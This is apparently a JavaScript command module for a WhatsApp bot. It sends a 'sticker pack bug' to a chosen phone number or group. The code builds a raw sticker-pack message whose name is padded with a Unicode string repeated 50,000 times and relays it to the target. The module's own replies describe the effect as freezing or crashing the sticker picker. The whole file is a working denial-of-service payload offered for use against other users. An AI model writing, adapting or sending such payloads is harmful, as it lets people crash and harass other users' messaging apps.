// ⟦EXPERT ⟧ .stickerbug — sticker pack name overflow (RennZSync fork)
// No upstream baileys imports — uses raw object with relayMessage

async function ownerOnly(z) {
  return !!z.isOwner
}

async function resolveTarget(z) {
  const arg = (z.args?.[0] || '').trim()
  if (!arg) return z.jid
  if (arg.includes('@')) return arg
  const digits = arg.replace(/[^0-9]/g, '')
  if (!digits) return z.jid
  try {
    const res = await z.sock.onWhatsApp(digits)
    if (res?.[0]?.exists) return res[0].jid
  } catch {}
  if (digits.length > 15) return `${digits}@lid`
  return `${digits}@s.whatsapp.net`
}

export default {
  name: 'stickerbug1',
  aliases: ['sbug1', 'stickerpack1', 'packbug1'],
  desc: 'Send sticker pack name overflow bug (owner only)',
  async run(z) {
    await z.react('🎨').catch(() => {})
    try {
      if (!(await ownerOnly(z))) return z.reply('⛔ Owner only.')

      const target = await resolveTarget(z)

      if (target.endsWith('@g.us')) {
        try { await z.sock.groupMetadata(target) }
        catch { return z.reply(`❌ *Bot is not in group:* ${target}`) }
      }

      await z.reply(
        `💀 *Launching STICKER PACK BUG...*\n` +
        `📱 *Target:* ${target}\n` +
        `⏳ *Building pack...*`
      )

      // ─── Overflow string: 50,000 unicode chars ───
      const overflow = '𑇂𑆵𑆴𑆿'.repeat(50000)

      // ─── Raw message object — NO proto wrapper ───
      // relayMessage accepts plain objects and serializes internally
      const rawMessage = {
        stickerPackMessage: {
          stickerPackId: '37309bf9-480e-4d34-a351-0902caf5d947',
          name: 'XinvasionX' + overflow,
          publisher: '',
          stickers: [
            {
              fileName: 'nXhNU8isa17eNk7oTObJlbBO3fH-moBd4HK7aJHsJHU=.webp',
              isAnimated: false,
              emojis: ['☕ 🙂'],
              accessibilityLabel: 'A smiling, white cup contains a brown drink.',
              isLottie: false,
              mimetype: 'image/webp'
            }
          ],
          fileLength: '12101',
          fileSha256: 'x8B6VRvQioEI5QiSc1PUfMQ/WScuCxSRe6ESgeE4vZI=',
          fileEncSha256: 'VgG2MXPYQrM19qVCnTM8gbroMrJ4OGsrFr85VnwTgw4=',
          mediaKey: 'Z6PBAr8+VBRm3rbLHGFGsqK1NWKAWUhJiEoexy8/8rg=',
          directPath: '/v/t62.15575-24/845116548_1120271783814388_1413355647273198645_n.enc?ccb=11-4&oh=01_Q5Aa5wHPKRX2pMwkNliwOhrHmhjFJn3H_FSO-5aE5ECexkHCmw&oe=6AF21C64&_nc_sid=5e03e0',
          contextInfo: {
            mediaDomainInfo: {
              mediaKeyDomain: 'MEDIA_KEY_DOMAIN_E2EE',
              e2EeMediaKey: 'Z6PBAr8+VBRm3rbLHGFGsqK1NWKAWUhJiEoexy8/8rg='
            }
          },
          mediaKeyTimestamp: '1791661738',
          trayIconFileName: '37309bf9-480e-4d34-a351-0902caf5d947.png',
          thumbnailDirectPath: '/v/t62.15575-24/844296080_2359855774752573_2108954759510968231_n.enc?ccb=11-4&oh=01_Q5Aa5wG-HoZduA-vmfcIgs-hx21cfZH7CFyJF8fSLqdA_1lkQg&oe=6AF20F30&_nc_sid=5e03e0',
          thumbnailSha256: 'AVOoVxfr9Ihoe5tkB8CkpWEUAny3WrxeD5gsriDt7Dw=',
          thumbnailEncSha256: 'pROAWbDdLnFSGEYMNNz7aPxzRLdE86ivzLbg+hmPmaA=',
          thumbnailHeight: 252,
          thumbnailWidth: 252,
          imageDataHash: 'NTA0MjBkNGIyMDIwNDNjNDVkMDUzMDBkMTRlNTY3ZDJkMGM0NDZlMGQyMjZhZTMzYWIzZTI3NzJkOWY1OTg2MQ==',
          stickerPackSize: '11733',
          stickerPackOrigin: 'USER_CREATED'
        }
      }

      // ─── Relay with message ID ───
      const messageId = `3EB0${Math.random().toString(36).slice(2, 12).toUpperCase()}`

      await z.sock.relayMessage(target, rawMessage, {
        messageId
      })

      await z.reply(
        `💀 *STICKER PACK BUG SENT!*\n\n` +
        `📱 *Target:* ${target}\n` +
        `🎨 *Payload:* 50,000 unicode chars in pack name\n` +
        `💥 *Effect:* sticker picker freeze / crash`
      )
      await z.react('✅').catch(() => {})
    } catch (e) {
      console.error('[stickerbug]', e)
      await z.reply(`❌ *Sticker bug failed*\n${e.message}`)
      await z.react('❌').catch(() => {})
    }
  }
}
